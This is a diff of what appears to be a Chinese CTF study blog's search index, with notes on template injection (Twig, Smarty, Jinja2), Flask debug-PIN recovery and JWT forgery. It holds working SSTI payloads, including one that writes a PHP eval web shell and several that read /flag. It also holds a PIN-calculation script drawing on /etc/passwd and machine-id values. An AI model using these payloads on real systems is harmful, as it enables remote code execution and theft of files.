@@ -36,25 +36,6 @@
   
   
   <entry>
-    <title>SSTI模版注入</title>
-    <link href="/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
-    <url>/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
-    
-    <content type="html"><![CDATA[<p><img src="/blogs/../images/SSTI.png" alt="SSTI"></p><h2 id="twig模板注入"><a href="#twig模板注入" class="headerlink" title="twig模板注入"></a>twig模板注入</h2><p><a href="https://xz.aliyun.com/news/9506">https://xz.aliyun.com/news/9506</a></p><ol><li>1.x版本payload: <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > flag.php")&#125;&#125;</code></li><li>2.x&#x2F;3.x 版本payload：<code>&#123;&#123;["ls"]|map("system")&#125;&#125;</code>或者<code>&#123;&#123;["id"]|filter("system")&#125;&#125;</code>或者<code>&#123;&#123;["id", 0]|sort("system")&#125;&#125;</code>或者<code>&#123;&#123;[0, 0]|reduce("system", "id")&#125;&#125;</code></li></ol><h2 id="smarty模板注入"><a href="#smarty模板注入" class="headerlink" title="smarty模板注入"></a>smarty模板注入</h2><p><a href="https://xz.aliyun.com/t/12220">https://xz.aliyun.com/t/12220</a></p><p>曾经用到的方法：</p><ol><li>{if PHP代码}{&#x2F;if}<br> 如 {if system(‘cat &#x2F;flag’)}{&#x2F;if}</li></ol><h2 id="python模板注入漏洞"><a href="#python模板注入漏洞" class="headerlink" title="python模板注入漏洞"></a>python模板注入漏洞</h2><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><h2 id="jinja"><a href="#jinja" class="headerlink" title="jinja"></a>jinja</h2><p><a href="https://xz.aliyun.com/news/6481">各种过滤</a><br><code>__globals__[&#39;os&#39;]</code>可以用<code>__globals__.os</code>直接代替,省去了中括号引号</p>获取配置<p><a href="https://buuoj.cn/challenges#[WesternCTF2018]shrine">配置被手动置为none</a>时，可以从其他的地方访问config，由于他们不会被同时置为none，因此还保留原有配置。<br>payload:<br><code>&#123;&#123;self.__dict__&#125;&#125;</code><br><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></p><h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><pre><code class="hljs">可以直接用undefined这个类，而且里面有很多可用函数，如 </code></pre><p><code>&#123;&#123;a.__init__.__globals__.__builtins__.eval(\"__\\x69mport__('o'+'s').popen('ls /').read()\")&#125;&#125;</code><br><code>self[&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;__buil&#39;&#39;tins__&#39;][&#39;__impo&#39;&#39;rt__&#39;](&#39;o&#39;&#39;s&#39;).popen(&#39;ls;ls /;nl /flag&#39;).read()</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;fla&#39;+&#39;g&#39;,&#39;r&#39;).read()</code><br>    ，甚至不用找可用的类……<br><strong>常见payload</strong></p><ol><li><p><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['o'+'s'].popen('ls').read()&#125;&#125;</code></p></li><li><p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')&#125;&#125;</code></p></li><li><p><code>&#123;&#123;''.__class__.__mro__[0].__subclasses__()[40]("fl4g").read()&#125;&#125;</code>，其中[40]是file类</p></li><li><p><code>&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__\\x69mport__(&#39;os&#39;).popen(&#39;cat+/flag&#39;).read()\&quot;)</code><br> 132指warnings.catch_warnings</p></li></ol><p>当request没被过滤时,用request绕过</p><p><strong>原理解释</strong></p><p>Python复制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-built_in">id</span> = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)<br>    html = <span class="hljs-string">&#x27;&lt;h3&gt;%s&lt;/h3&gt;&#x27;</span>%(<span class="hljs-built_in">id</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(html)<br></code></pre></td></tr></table></figure><p>某些渲染器如python-jinja会将<code>&#123;&#123;&#125;&#125;</code>内包围的内容视为变量，因此会先计算变量（本质上就是执行），因此可以在<code>&#123;&#123;&#125;&#125;</code>中写入想要执行的代码，这里的参数id可能比较特殊，参数值直接写在当前目录下就行。</p><p>接下来就要找到os模块，利用popen函数来获取文件内容（popen用于执行命令，将执行结果输入到文件中，并返回这个文件对象）。</p><p><code>__class__</code> 用于访问当前类，<code>__mro__</code> 访问当前类的基类，最后一个一般是object类，是所有类的基类，<code>__subclasses__()</code>方法返回基于当前类的所有之类，到这里可以得到所有可以用到的类，[71]中的数字可以用爆破的方式<code>&#123;&#123;url/"".__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os']&#125;&#125;</code>得到，目的是得到一个包含了，<code>__init__.__globals__</code>可以获得该类所在模块中的所有用到的全局变量，包括在该模块中引用的模块，返回类型是字典。</p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>fenjing</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤关键词，如<code>os, eval</code>,可以用字符串拼接绕过<br>如<code>[&#39;ev&#39;+&#39;al&#39;]</code></p><p>引号内的字符还可以使用hex或unicode编码绕过<br>如<code>[&#39;eval&#39;] --&gt; [&#39;\x65val&#39;]</code><br>由于python会对字符串自动转义一次,写\x65 等于写 e,因此要写成<code>[&#39;\\x65val&#39;]</code>,这样真正发送的才是\x65</p><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p><a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">文章</a></p><p>利用config保存，set设置，逐步简短最终payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.update(a=config.update)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(b=lipsum.__globals__)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(c=config.b.os)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(d=config.c.popen)%&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>SSTI</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>XXE</title>
     <link href="/blogs/XXE/XXE/"/>
     <url>/blogs/XXE/XXE/</url>
@@ -65,6 +46,44 @@
     <categories>
       
       <category>XXE</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>flask debug模式</title>
+    <link href="/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/"/>
+    <url>/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/</url>
+    
+    <content type="html"><![CDATA[<ol><li>服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得</li><li>module name 一般不变就是flask.app</li><li>getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变</li><li>flask库下app.py的绝对路径。通过报错信息就会泄露该值。</li><li>mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address获得</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;1e:eb:d7:36:97:1e&#x27;</span>));<br></code></pre></td></tr></table></figure><ol start="6"><li>机器的id。<br> linux<br> &#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i<br> docker<br> &#x2F;proc&#x2F;self&#x2F;cgroup：</li></ol><p>pin码计算脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br> <br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>  <span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br> <br>private_bits = [<br>    <span class="hljs-string">&#x27;170380142167213&#x27;</span>,  <span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br> <br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>得到pin码之后在报错页面<br><img src="/blogs/images/flask_debug_mode1.png" alt="报错页面"><br>点击shell图标(当鼠标浮于任何一行文字时会出现)<br>输入pin码</p><p>得到shell<br><img src="/blogs/images/flask_debug_mode2.png" alt="shell"><br>最好用os.popen</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>flask</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>jwt伪造</title>
+    <link href="/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/"/>
+    <url>/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/</url>
+    
+    <content type="html"><![CDATA[<h2 id="jwt的构成"><a href="#jwt的构成" class="headerlink" title="jwt的构成"></a>jwt的构成</h2><p>xxx.xxx.xxx<br>第一部分标示算法等，第二部分是信息，二者均用base64编码<br>第三部分是签名（用第一部分的算法和私钥）</p><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><ol><li>未签名</li></ol><p>所有的jwt都合法，任意修改数据</p><ol start="2"><li>允许使用none进行签名</li></ol><p>把第一部分的算法改成<code>none</code>, 再丢弃最后的签名，随意篡改第二部分的信息</p><ol start="3"><li>弱密钥</li></ol><p><code>python jwt_tool.py &quot;&lt;JWT&gt;&quot; -C -d jwt-common.txt</code><br>其中<code>jwt-common.txt</code>是密钥字典</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>jwt</category>
       
     </categories>
     
@@ -106,16 +125,16 @@
   
   
   <entry>
-    <title>flask debug模式</title>
-    <link href="/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/"/>
-    <url>/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/</url>
+    <title>SSTI模版注入</title>
+    <link href="/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
+    <url>/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
     
-    <content type="html"><![CDATA[<ol><li>服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得</li><li>module name 一般不变就是flask.app</li><li>getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变</li><li>flask库下app.py的绝对路径。通过报错信息就会泄露该值。</li><li>mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address获得</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;1e:eb:d7:36:97:1e&#x27;</span>));<br></code></pre></td></tr></table></figure><ol start="6"><li>机器的id。<br> linux<br> &#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i<br> docker<br> &#x2F;proc&#x2F;self&#x2F;cgroup：</li></ol><p>pin码计算脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br> <br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>  <span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br> <br>private_bits = [<br>    <span class="hljs-string">&#x27;170380142167213&#x27;</span>,  <span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br> <br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>得到pin码之后在报错页面<br><img src="/blogs/images/flask_debug_mode1.png" alt="报错页面"><br>点击shell图标(当鼠标浮于任何一行文字时会出现)<br>输入pin码</p><p>得到shell<br><img src="/blogs/images/flask_debug_mode2.png" alt="shell"><br>最好用os.popen</p>]]></content>
+    <content type="html"><![CDATA[<p><img src="/blogs/images/SSTI.png" alt="SSTI"></p><h2 id="twig模板注入"><a href="#twig模板注入" class="headerlink" title="twig模板注入"></a>twig模板注入</h2><p><a href="https://xz.aliyun.com/news/9506">https://xz.aliyun.com/news/9506</a></p><ol><li>1.x版本payload: <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > flag.php")&#125;&#125;</code></li><li>2.x&#x2F;3.x 版本payload：<code>&#123;&#123;["ls"]|map("system")&#125;&#125;</code>或者<code>&#123;&#123;["id"]|filter("system")&#125;&#125;</code>或者<code>&#123;&#123;["id", 0]|sort("system")&#125;&#125;</code>或者<code>&#123;&#123;[0, 0]|reduce("system", "id")&#125;&#125;</code></li></ol><h2 id="smarty模板注入"><a href="#smarty模板注入" class="headerlink" title="smarty模板注入"></a>smarty模板注入</h2><p><a href="https://xz.aliyun.com/t/12220">https://xz.aliyun.com/t/12220</a></p><p>曾经用到的方法：</p><ol><li>{if PHP代码}{&#x2F;if}<br> 如 {if system(‘cat &#x2F;flag’)}{&#x2F;if}</li></ol><h2 id="python模板注入漏洞"><a href="#python模板注入漏洞" class="headerlink" title="python模板注入漏洞"></a>python模板注入漏洞</h2><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><h2 id="jinja"><a href="#jinja" class="headerlink" title="jinja"></a>jinja</h2><p><a href="https://xz.aliyun.com/news/6481">各种过滤</a><br><code>__globals__[&#39;os&#39;]</code>可以用<code>__globals__.os</code>直接代替,省去了中括号引号</p>获取配置<p><a href="https://buuoj.cn/challenges#[WesternCTF2018]shrine">配置被手动置为none</a>时，可以从其他的地方访问config，由于他们不会被同时置为none，因此还保留原有配置。<br>payload:<br><code>&#123;&#123;self.__dict__&#125;&#125;</code><br><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></p><h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><pre><code class="hljs">可以直接用undefined这个类，而且里面有很多可用函数，如 </code></pre><p><code>&#123;&#123;a.__init__.__globals__.__builtins__.eval(\"__\\x69mport__('o'+'s').popen('ls /').read()\")&#125;&#125;</code><br><code>self[&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;__buil&#39;&#39;tins__&#39;][&#39;__impo&#39;&#39;rt__&#39;](&#39;o&#39;&#39;s&#39;).popen(&#39;ls;ls /;nl /flag&#39;).read()</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;fla&#39;+&#39;g&#39;,&#39;r&#39;).read()</code><br>    ，甚至不用找可用的类……<br><strong>常见payload</strong></p><ol><li><p><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['o'+'s'].popen('ls').read()&#125;&#125;</code></p></li><li><p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')&#125;&#125;</code></p></li><li><p><code>&#123;&#123;''.__class__.__mro__[0].__subclasses__()[40]("fl4g").read()&#125;&#125;</code>，其中[40]是file类</p></li><li><p><code>&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__\\x69mport__(&#39;os&#39;).popen(&#39;cat+/flag&#39;).read()\&quot;)</code><br> 132指warnings.catch_warnings</p></li></ol><p>当request没被过滤时,用request绕过</p><p><strong>原理解释</strong></p><p>Python复制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-built_in">id</span> = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)<br>    html = <span class="hljs-string">&#x27;&lt;h3&gt;%s&lt;/h3&gt;&#x27;</span>%(<span class="hljs-built_in">id</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(html)<br></code></pre></td></tr></table></figure><p>某些渲染器如python-jinja会将<code>&#123;&#123;&#125;&#125;</code>内包围的内容视为变量，因此会先计算变量（本质上就是执行），因此可以在<code>&#123;&#123;&#125;&#125;</code>中写入想要执行的代码，这里的参数id可能比较特殊，参数值直接写在当前目录下就行。</p><p>接下来就要找到os模块，利用popen函数来获取文件内容（popen用于执行命令，将执行结果输入到文件中，并返回这个文件对象）。</p><p><code>__class__</code> 用于访问当前类，<code>__mro__</code> 访问当前类的基类，最后一个一般是object类，是所有类的基类，<code>__subclasses__()</code>方法返回基于当前类的所有之类，到这里可以得到所有可以用到的类，[71]中的数字可以用爆破的方式<code>&#123;&#123;url/"".__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os']&#125;&#125;</code>得到，目的是得到一个包含了，<code>__init__.__globals__</code>可以获得该类所在模块中的所有用到的全局变量，包括在该模块中引用的模块，返回类型是字典。</p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>fenjing</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤关键词，如<code>os, eval</code>,可以用字符串拼接绕过<br>如<code>[&#39;ev&#39;+&#39;al&#39;]</code></p><p>引号内的字符还可以使用hex或unicode编码绕过<br>如<code>[&#39;eval&#39;] --&gt; [&#39;\x65val&#39;]</code><br>由于python会对字符串自动转义一次,写\x65 等于写 e,因此要写成<code>[&#39;\\x65val&#39;]</code>,这样真正发送的才是\x65</p><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p><a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">文章</a></p><p>利用config保存，set设置，逐步简短最终payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.update(a=config.update)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(b=lipsum.__globals__)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(c=config.b.os)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(d=config.c.popen)%&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
     
     
     <categories>
       
-      <category>flask</category>
+      <category>SSTI</category>
       
     </categories>
     
@@ -135,25 +154,6 @@
     <categories>
       
       <category>javascript</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>jwt伪造</title>
-    <link href="/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/"/>
-    <url>/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/</url>
-    
-    <content type="html"><![CDATA[<h2 id="jwt的构成"><a href="#jwt的构成" class="headerlink" title="jwt的构成"></a>jwt的构成</h2><p>xxx.xxx.xxx<br>第一部分标示算法等，第二部分是信息，二者均用base64编码<br>第三部分是签名（用第一部分的算法和私钥）</p><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><ol><li>未签名</li></ol><p>所有的jwt都合法，任意修改数据</p><ol start="2"><li>允许使用none进行签名</li></ol><p>把第一部分的算法改成<code>none</code>, 再丢弃最后的签名，随意篡改第二部分的信息</p><ol start="3"><li>弱密钥</li></ol><p><code>python jwt_tool.py &quot;&lt;JWT&gt;&quot; -C -d jwt-common.txt</code><br>其中<code>jwt-common.txt</code>是密钥字典</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>jwt</category>
       
     </categories>
     
@@ -239,25 +239,6 @@
   
   
   <entry>
-    <title>flask session伪造</title>
-    <link href="/blogs/flask/python%20session%E4%BC%AA%E9%80%A0/"/>
-    <url>/blogs/flask/python%20session%E4%BC%AA%E9%80%A0/</url>
-    
